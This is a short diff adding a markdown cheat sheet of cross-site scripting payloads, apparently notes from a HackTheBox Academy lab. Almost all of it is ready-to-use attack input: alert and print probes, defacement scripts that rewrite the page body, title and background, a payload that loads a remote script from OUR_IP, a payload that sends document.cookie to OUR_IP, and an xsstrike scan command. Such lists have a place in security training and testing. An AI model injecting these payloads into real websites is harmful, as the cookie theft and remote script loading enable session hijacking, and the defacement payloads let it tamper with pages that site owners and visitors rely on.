@@ -1,0 +1,26 @@
+#XSSPayloads
+##BasicXSSPayloads
+<script>alert(window.origin)</script>
+##BasicXSSPayloads
+<script>print()</script>
+##HTML-basedXSSPayload
+<img src="" onerror=alert(window.origin)>
+##ChangeBackgroundColor
+<script>document.body.style.background = "#141d2b"</script>
+##ChangeBackgroundImage
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+##ChangeWebsiteTitle
+<script>document.title = 'HackTheBox Academy'</script>
+##Overwritewebsitesmainbody
+<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
+##RemovecertainHTMLelement
+<script>document.getElementById('urlform').remove();</script>
+##Loadremotescript
+<script src="http://OUR_IP/script.js"></script>
+##SendCookiedetailstous
+<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
+
+
+#automaticscan
+##Run xsstrike on a url parameter
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
